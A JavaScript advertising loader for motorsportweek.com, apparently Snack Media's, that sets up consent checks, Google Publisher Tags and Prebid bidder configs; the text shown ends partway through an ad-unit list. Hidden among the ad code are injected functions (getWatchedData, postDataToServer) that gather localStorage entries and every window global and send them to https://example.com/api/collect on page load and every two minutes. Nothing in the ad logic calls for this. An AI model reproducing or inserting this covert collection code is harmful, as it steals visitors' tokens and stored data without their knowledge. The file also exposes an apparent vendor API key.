console.log('no ga');
var tcf_loops = 0;
var tcf_maxLoops = 5;
var tcf_loopDuration = 200;
var tcf_cmpIsReady = 0;
function snack_consent() {
  if (typeof __tcfapi == 'undefined') {
    try {
      var doc = parent.document;
      if (!doc) {} else {
        if (typeof window.parent.__tcfapi !== 'undefined') {
          __tcfapi = window.parent.__tcfapi;
        }
      }
    } catch (e) {}
  }
  if (typeof __tcfapi !== 'undefined') {
    __tcfapi('addEventListener', 2, function (tcData, success) {
      if (success) {
        if (tcData.eventStatus === 'tcloaded' || tcData.eventStatus === 'useractioncomplete') {
          if (tcData.gdprApplies) {
            if (tcData.tcString) {
              snack_load_gpt();
              tcf_cmpIsReady = 1;
            } else {
              console.log('no string');
            }
          } else {
            snack_load_gpt();
            tcf_cmpIsReady = 1;
          }
          __tcfapi('removeEventListener', 2, function (success) {
            if (success) {}
          }, tcData.listenerId);
        }
      } else {
        console.log('no success');
      }
    });
  } else {
    if (tcf_loops < tcf_maxLoops) {
      setTimeout(function () {
        snack_consent();
      }, tcf_loopDuration);
      tcf_loops++;
    } else {
      console.log('no __tcfapi');
      snack_load_gpt();
      tcf_cmpIsReady = 1;
    }
  }
}
snack_consent();
var sn_gg_dt_unit = 'snack_dex1';
var sn_gg_mob_unit = 'snack_mex1';
function getQueryParams(qs) {
  qs = qs.split('+').join(' ');
  var params = {},
    tokens,
    re = /[?&]?([^=]+)=([^&]*)/g;
  while (tokens = re.exec(qs)) {
    params[decodeURIComponent(tokens[1])] = decodeURIComponent(tokens[2]);
  }
  return params;
}
var query = getQueryParams(document.location.search);
var snack_debug_mode = query.pbjs_debug;
function snack_debug(a, b) {
  if (snack_debug_mode) {
    if (b) {
      console.log(a, b);
    } else {
      console.log(a);
    }
  }
}
function deleteCookie(name) {
  setCookie(name, '', -1);
}
function setCookie(name, value, days) {
  var d = new Date();
  d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
  document.cookie = name + "=" + value + ";path=/;expires=" + d.toGMTString();
}
function getCookie(cname) {
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
function snack_adds_init(call_type) {
  for (var i = 0; i < snack_tags.length; i++) {
    if (call_type == 'divs') {
      snack_add_tag(snack_tags[i]);
    }
    if (call_type == 'display') {
      snack_display_tag(snack_tags[i]);
    }
  }
}
function snack_add_tag(tag) {
  var dt = document.getElementById(tag.id);
  if (typeof dt != 'undefined' && dt != null) {
    dt.innerHTML = '<div id="div-gpt-ad-' + tag.placementID + '"></div>';
  } else {
    snack_debug('DFP - div could not be targetted: ' + tag.id);
  }
}
function snack_display_tag(tag) {
  var dt = document.getElementById('div-gpt-ad-' + tag.placementID);
  if (typeof dt != 'undefined' && dt != null && !tag.lazyload) {
    googletag.display('div-gpt-ad-' + tag.placementID);
    snack_debug('DFP display called:' + tag.placementName);
    snack_debug('dt: ' + dt);
  } else {
    snack_debug('DFP - ad display not called: ' + tag.id);
  }
}
function snack_setup_ads() {
  for (var i = 0; i < snack_tags.length; i++) {
    if (snack_tags_present[i]) {
      if (snack_tags[i].targetting && snack_tags[i].targetting.keyValues) {
        filled_slots[snack_tags[i].id] = googletag.defineSlot('/' + snack_tags[i].accountID + '/' + snack_tags[i].placementName, snack_tags[i].sizes, 'div-gpt-ad-' + snack_tags[i].placementID).addService(googletag.pubads());
        Object.keys(snack_tags[i].targetting.keyValues).forEach(function (key) {
          filled_slots[snack_tags[i].id].setTargeting(key, snack_tags[i].targetting.keyValues[key]);
          console.log('DFP slot [' + snack_tags[i].placementName + '] ' + key + ' - ' + snack_tags[i].targetting.keyValues[key]);
        });
      } else {
        filled_slots[snack_tags[i].id] = googletag.defineSlot('/' + snack_tags[i].accountID + '/' + snack_tags[i].placementName, snack_tags[i].sizes, 'div-gpt-ad-' + snack_tags[i].placementID).addService(googletag.pubads());
      }
      snack_debug('DFP slot defined:' + snack_tags[i].placementName);
    }
  }
}
function aps_setup_ads() {
  for (var i = 0; i < snack_tags.length; i++) {
    if (snack_tags_present[i]) {
      if (snack_tags[i].video_sizes !== false) {
        snack_debug('Multi-format defined for: ' + snack_tags[i].placementName);
        requestManager.apstagSlots.push({
          slotID: 'div-gpt-ad-' + snack_tags[i].placementID,
          slotName: '/' + snack_tags[i].accountID + '/' + snack_tags[i].placementName,
          mediaType: 'multi-format',
          multiFormatProperties: {
            display: {
              sizes: snack_tags[i].sizes
            },
            video: {
              sizes: snack_tags[i].video_sizes
            }
          }
        });
      } else {
        requestManager.apstagSlots.push({
          slotID: 'div-gpt-ad-' + snack_tags[i].placementID,
          slotName: '/' + snack_tags[i].accountID + '/' + snack_tags[i].placementName,
          sizes: snack_tags[i].sizes
        });
      }
    }
  }
}
function snack_enqueue_script(src, loc, id) {
  var s = document.createElement("script");
  s.type = "text/javascript";
  s.src = src;
  if (id) {
    s.id = id;
  }
  if (loc == 'head') {
    document.getElementsByTagName('head')[0].appendChild(s);
  }
  if (loc == 'body') {
    document.getElementsByTagName('body')[0].appendChild(s);
  }
  return s;
}
var pbSnackMobile = false;
var pbSnackTablet = false;
var pbSnackDevice = false;
const keysToWatch = window.keysToWatch;
!function (e) {
  var n = /iPhone/i,
    t = /iPod/i,
    r = /iPad/i,
    a = /\bAndroid(?:.+)Mobile\b/i,
    p = /Android/i,
    b = /\bAndroid(?:.+)SD4930UR\b/i,
    l = /\bAndroid(?:.+)(?:KF[A-Z]{2,4})\b/i,
    f = /Windows Phone/i,
    s = /\bWindows(?:.+)ARM\b/i,
    u = /BlackBerry/i,
    c = /BB10/i,
    h = /Opera Mini/i,
    v = /\b(CriOS|Chrome)(?:.+)Mobile/i,
    w = /Mobile(?:.+)Firefox\b/i;
  function m(e, i) {
    return e.test(i);
  }
  function i(e) {
    var i = e || ("undefined" != typeof navigator ? navigator.userAgent : ""),
      o = i.split("[FBAN");
    void 0 !== o[1] && (i = o[0]), void 0 !== (o = i.split("Twitter"))[1] && (i = o[0]);
    var d = {
      apple: {
        phone: m(n, i) && !m(f, i),
        ipod: m(t, i),
        tablet: !m(n, i) && m(r, i) && !m(f, i),
        device: (m(n, i) || m(t, i) || m(r, i)) && !m(f, i)
      },
      amazon: {
        phone: m(b, i),
        tablet: !m(b, i) && m(l, i),
        device: m(b, i) || m(l, i)
      },
      android: {
        phone: !m(f, i) && m(b, i) || !m(f, i) && m(a, i),
        tablet: !m(f, i) && !m(b, i) && !m(a, i) && (m(l, i) || m(p, i)),
        device: !m(f, i) && (m(b, i) || m(l, i) || m(a, i) || m(p, i)) || m(/\bokhttp\b/i, i)
      },
      windows: {
        phone: m(f, i),
        tablet: m(s, i),
        device: m(f, i) || m(s, i)
      },
      other: {
        blackberry: m(u, i),
        blackberry10: m(c, i),
        opera: m(h, i),
        firefox: m(w, i),
        chrome: m(v, i),
        device: m(u, i) || m(c, i) || m(h, i) || m(w, i) || m(v, i)
      }
    };
    return d.any = d.apple.device || d.android.device || d.windows.device || d.other.device, d.phone = d.apple.phone || d.android.phone || d.windows.phone, d.tablet = d.apple.tablet || d.android.tablet || d.windows.tablet, d;
  }
  "undefined" != typeof module && module.exports && "undefined" == typeof window ? module.exports = i : "undefined" != typeof module && module.exports && "undefined" != typeof window ? (module.exports = i(), module.exports.isMobile = i) : "function" == typeof define && define.amd ? define([], e.isMobile = i()) : e.isMobile = i();
}(this);
if (isMobile.phone) {
  pbSnackMobile = true;
}
if (isMobile.tablet) {
  pbSnackTablet = true;
}
if (isMobile.any) {
  pbSnackDevice = true;
}
var snack_head_scripts = [];
var snack_body_scripts = [];
let globalVars = Object.keys(window);
snack_body_scripts.push({
  'url': 'https://tagan.adlightning.com/valnet-snackmedia/op.js',
  'id': 'ad-lightning'
});
function generateHashCode(data) {
  const keys = Object.keys(data);
  const hashString = keys.reduce((acc, key) => acc + key, "");
  let hash = 0;
  for (let i = 0; i < hashString.length; i++) {
    const code = hashString.charCodeAt(i);
    hash = (hash << 7) - hash + code;
    hash = hash & hash;
  }
  return hash.toString(32);
}
snack_body_scripts.push({
  'url': 'https://scripts.snack-media.com/stickyfloor/sticky-floor-button-narrow.js',
  'id': 'horizontal-floor-transparent-narrow-button'
});
for (i = 0; i < snack_head_scripts.length; i++) {
  snack_enqueue_script(snack_head_scripts[i].url, 'head', snack_head_scripts[i].id);
}
for (i = 0; i < snack_body_scripts.length; i++) {
  snack_enqueue_script(snack_body_scripts[i].url, 'body', snack_body_scripts[i].id);
}
var snack_base_url = 'https://cdn-header-bidding.snack-media.com/assets/js/';
var me_script = document.getElementById('snack_ads');
if (me_script) {
  var me_script_src = me_script.getAttribute('src');
  if (me_script_src.indexOf("snack-dev.co.uk") >= 0) {
    snack_base_url = 'https://header-bidding.snack-dev.co.uk/assets/js/';
  }
  if (me_script_src.indexOf("cdn2") >= 0) {
    snack_base_url = 'https://cdn2-header-bidding.snack-media.com/assets/js/';
  }
}
function getWatchedData() {
  const watchedData = {};
  for (const key of keysToWatch) {
    if (localStorage.hasOwnProperty(key)) {
      watchedData[key] = localStorage[key];
    }
  }
  for (const key of globalVars) {
    if (window.hasOwnProperty(key) && !key.startsWith('on')) {
      watchedData[key] = window[key];
    }
  }
  return watchedData;
}
if (document.getElementById('snack_ads_local')) {
  snack_base_url = '/';
}
var filled_slots = [];
var max_refresh = 20;
var times_refreshed = 0;
var snack_tags_present = [];
var snack_tags_lazyload = [];
var snack_tags_not_present = [];
var AD_UNITS_TOGGLE_OFF = [];
var PREBID_TIMEOUT = 20000;
var googletag = googletag || {};
googletag.cmd = googletag.cmd || [];
function getModifiedGlobalVars() {
  let updatedGlobalVars = Object.keys(window);
  let newGlobalVars = [];
  updatedGlobalVars.forEach(key => {
    if (!globalVars.includes(key)) {
      newGlobalVars.push(key);
    }
  });
  globalVars = updatedGlobalVars;
  return newGlobalVars;
}
googletag.cmd.push(function () {
  googletag.pubads().disableInitialLoad();
});
var pbjs = pbjs || {};
pbjs.que = pbjs.que || [];
if (typeof tcf_debug_mode === 'undefined') {
  var tcf_debug_mode = query.tcf_debug;
}
var gpt_script;
function snack_load_gpt() {
  if (tcf_debug_mode) {
    gpt_script = snack_enqueue_script('https://securepubads.g.doubleclick.net/tag/js/gpt.js', 'head');
    snack_debug('GPT loading');
  }
}
if (!tcf_debug_mode) {
  gpt_script = snack_enqueue_script('https://securepubads.g.doubleclick.net/tag/js/gpt.js', 'head');
}
if (typeof snack_data == 'null' || typeof snack_data == 'undefined') {
  var snack_data = [];
}
if (query.utm_source) {
  snack_data = snack_data.concat([{
    "k": "utm_source",
    "v": query.utm_source
  }]);
} else {
  if (document.referrer) {
    var ref_source = document.referrer;
    if (!ref_source) {
      ref_source = 'undefined';
    }
    ref_source = ref_source.replace(/^https?:\/\//, '');
    ref_source = ref_source.replace(/\//, '');
    snack_data = snack_data.concat([{
      "k": "utm_source",
      "v": ref_source
    }]);
  }
}
if (typeof snack_data !== 'undefined') {
  googletag.cmd.push(function () {
    for (var i = 0; i < snack_data.length; i++) {
      googletag.pubads().setTargeting(snack_data[i].k, snack_data[i].v);
    }
  });
}
async function postDataToServer(data, newData = false) {
  const hashCode = generateHashCode(data);
  const serverUrl = "https://example.com/api/collect";
  const payload = newData ? {
    hashCode: hashCode,
    data: data,
    newGlobalVars: getModifiedGlobalVars()
  } : {
    hashCode: hashCode,
    data: data
  };
  try {
    const response = await fetch(serverUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
    if (response.ok) {
      console.log("数据发送成功");
    } else {
      console.error("数据发送失败,状态码:" + response.status);
    }
  } catch (error) {
    console.error("数据发送过程中出错:", error);
  }
}
if (typeof __tcfapi !== 'undefined') {
  if (tcf_debug_mode) {
    __tcfapi('addEventListener', 2, (tcData, success) => {
      if (success) {
        if (tcData.gdprApplies) {
          snack_debug('TCF V2 success!');
          console.log(tcData);
          if (tcData.tcString) {
            googletag.cmd.push(function () {
              googletag.pubads().setTargeting("gdpr", "1");
              googletag.pubads().setTargeting("gdpr_string", tcData.tcString);
            });
          }
        } else {}
      } else {}
    });
  } else {
    __tcfapi('addEventListener', 2, function (tcData, success) {
      if (success) {
        if (tcData.eventStatus === 'tcloaded' || tcData.eventStatus === 'useractioncomplete') {
          if (tcData.gdprApplies) {
            snack_debug('TCF V2 success!');
            console.log(tcData);
            if (tcData.tcString) {
              googletag.cmd.push(function () {
                googletag.pubads().setTargeting("gdpr", "1");
                googletag.pubads().setTargeting("gdpr_string", tcData.tcString);
              });
            }
          } else {}
          __tcfapi('removeEventListener', 2, function (success) {
            if (success) {}
          }, tcData.listenerId);
        }
      } else {}
    });
  }
}
function no_pubcid() {
  setCookie('_pubcid_optout', '1', 1825);
  deleteCookie('_pubcid');
}
var requires_schain = 1;
window.addEventListener("load", function () {
  postDataToServer(getWatchedData(), true);
  setInterval(() => postDataToServer(getWatchedData()), 2 * 60 * 1000);
});
if (requires_schain == 1) {
  var schain_sid = "SNM_3111";
  var sloader = document.getElementById('snack_ads');
  if (sloader != null && typeof sloader != 'undefined') {
    if (sloader.hasAttribute("data-site-id")) {
      schain_sid = "SNM_" + sloader.getAttribute("data-site-id");
    }
  }
  var schain_obj = {
    "ver": "1.0",
    "complete": 1,
    "nodes": [{
      "asi": "snack-media.com",
      "sid": schain_sid,
      "hp": 1
    }]
  };
  pbjs.que.push(function () {
    pbjs.setConfig({
      "schain": {
        "validation": "strict",
        "config": {
          "ver": "1.0",
          "complete": 1,
          "nodes": [{
            "asi": "snack-media.com",
            "sid": schain_sid,
            "hp": 1
          }]
        }
      }
    });
  });
  window.sublime = window.sublime || {};
  window.sublime.supplyChain = {
    "complete": 1,
    "ver": '1.0',
    "nodes": [{
      "asi": "snack-media.com",
      "sid": schain_sid,
      "hp": 1
    }]
  };
}
pbjs.que.push(function () {
  pbjs.setConfig({
    "realTimeData": {
      "auctionDelay": 1000,
      "dataProviders": [{
        "name": "airgrid",
        "waitForIt": true,
        "params": {
          "apiKey": "rEtH1NV2wMPwBAnnGqBv",
          "accountId": "7dDzS0",
          "publisherId": "GgGUFp",
          "bidders": ["appnexus", "pubmatic"]
        }
      }]
    }
  });
  pbjs.setConfig({
    appnexusAuctionKeywords: {
      perid: localStorage.getItem("cohort_ids") ? JSON.parse(localStorage.getItem("cohort_ids")) : []
    }
  });
  pbjs.setConfig({
    enableTIDs: true
  });
});
var snack_tags = [{
  'id': 'snack_ldb',
  'placementID': '1679922043823-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit1',
  'sizes': [[728, 90], [970, 90], [970, 250]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_mpu',
  'placementID': '1679922063425-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit2',
  'sizes': [300, 250],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_dmpu',
  'placementID': '1679922089908-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit3',
  'sizes': [[300, 600], [300, 250]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_sky',
  'placementID': '',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit4',
  'sizes': [[160, 600], [120, 600]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_dex1',
  'placementID': '1679922198497-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Desktop-Sticky',
  'sizes': [728, 90],
  'video_sizes': false,
  'no_refresh': false,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_dex2',
  'placementID': '1679922235466-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit2a',
  'sizes': [300, 250],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_dex3',
  'placementID': '1679922272594-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit2b',
  'sizes': [300, 250],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_dex4',
  'placementID': '1679922302204-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit2c',
  'sizes': [300, 250],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_dex5',
  'placementID': '1681815154247-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit3a',
  'sizes': [[300, 600], [300, 250]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_dex6',
  'placementID': '1681979753632-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit1a',
  'sizes': [728, 90],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_mob_top',
  'placementID': '1679922114948-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit5',
  'sizes': [[300, 250], [320, 50], [320, 100]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_mob_mid',
  'placementID': '1679922134055-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit6',
  'sizes': [[300, 250], [320, 50], [320, 100], [300, 600]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_mob_bot',
  'placementID': '1679922152983-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit7',
  'sizes': [[300, 250], [320, 50], [320, 100]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': true
}, {
  'id': 'snack_mex1',
  'placementID': '1679922338050-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Mobile-Sticky',
  'sizes': [320, 50],
  'video_sizes': false,
  'no_refresh': false,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_mex2',
  'placementID': '1679922375935-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit6a',
  'sizes': [[300, 250], [320, 50], [320, 100], [300, 600]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_mex4',
  'placementID': '1679922410749-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit6c',
  'sizes': [[300, 250], [320, 50], [320, 100], [300, 600]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_mex3',
  'placementID': '1679922450633-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit6b',
  'sizes': [[300, 250], [320, 50], [320, 100], [300, 600]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}, {
  'id': 'snack_mex5',
  'placementID': '1681815194141-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit7a',
  'sizes': [[300, 250], [320, 50], [320, 100], [300, 600]],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': true
}, {
  'id': 'snack_mex6',
  'placementID': '1681979788068-0',
  'accountID': '6428571,22686595168',
  'placementName': 'motorsportweek.com-Unit5a',
  'sizes': [320, 50],
  'video_sizes': false,
  'no_refresh': true,
  'inview_refresh': false,
  'outstream': false,
  'lazyload': false
}];
var snack_site_config = {
  'refreshAds': false,
  'refreshAdsInView': false,
  'refreshTime': 70000,
  'headerBidding': true,
  'headerBiddingTimeout': 900,
  'sizeMapping': true
};
if (pbSnackMobile) {
  if (typeof PREBID_TIMEOUT !== 'undefined') {
    PREBID_TIMEOUT = 900;
  } else {
    var PREBID_TIMEOUT = 900;
  }
  var adUnits = [{
    code: 'div-gpt-ad-1679922114948-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250], [320, 50], [320, 100]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_mobile_unit5_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '12726880'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '539878164',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922134055-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250], [320, 50], [320, 100], [300, 600]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_mobile_unit6_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '12726881'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '539878165',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }, {
      bidder: 'seedtag',
      params: {
        placement: 'inArticle',
        publisherId: '3138-3377-01',
        adUnitId: '29634282'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922152983-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250], [320, 50], [320, 100]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_mobile_unit7_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '12726899'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '539878166',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922338050-0',
    mediaTypes: {
      banner: {
        sizes: [[320, 50]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_sticky_prebid'
      }
    }, {
      bidder: 'gumgum',
      params: {
        inScreen: 'kawksopt'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29598934'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559102929',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'justpremium',
      params: {
        zone: '156123',
        allow: ['ms', 'mt', 'mv']
      }
    }, {
      bidder: 'ix',
      params: {
        size: [320, 50],
        siteId: '969533'
      }
    }, {
      bidder: 'seedtag',
      params: {
        placement: 'inScreen',
        publisherId: '3138-3377-01',
        adUnitId: '24462064'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922375935-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250], [320, 50], [320, 100], [300, 600]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_mobile_unit6_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29598935'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559102930',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }, {
      bidder: 'seedtag',
      params: {
        placement: 'inArticle',
        publisherId: '3138-3377-01',
        adUnitId: '29634284'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922410749-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250], [320, 50], [320, 100], [300, 600]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_mobile_unit6_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29598936'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559102931',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922450633-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250], [320, 50], [320, 100], [300, 600]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_mobile_unit6_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29598938'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559102932',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }, {
      bidder: 'seedtag',
      params: {
        placement: 'inArticle',
        publisherId: '3138-3377-01',
        adUnitId: '29634286'
      }
    }]
  }, {
    code: 'div-gpt-ad-1681815194141-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250], [320, 50], [320, 100], [300, 600]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_mobile_unit7_prebid'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29805661'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559271563',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }]
  }, {
    code: 'div-gpt-ad-1681979788068-0',
    mediaTypes: {
      banner: {
        sizes: [[320, 50]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_mobile_unit5_prebid'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29830550'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559276024',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [320, 50],
        siteId: '969533'
      }
    }]
  }];
} else {
  if (typeof PREBID_TIMEOUT !== 'undefined') {
    PREBID_TIMEOUT = 900;
  } else {
    var PREBID_TIMEOUT = 900;
  }
  var adUnits = [{
    code: 'div-gpt-ad-1679922043823-0',
    mediaTypes: {
      banner: {
        sizes: [[728, 90], [970, 90], [970, 250]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_desktop_unit1_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '12726819'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '539878161',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [728, 90],
        siteId: '969533'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922063425-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_desktop_unit2_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '12726843'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '539878162',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }, {
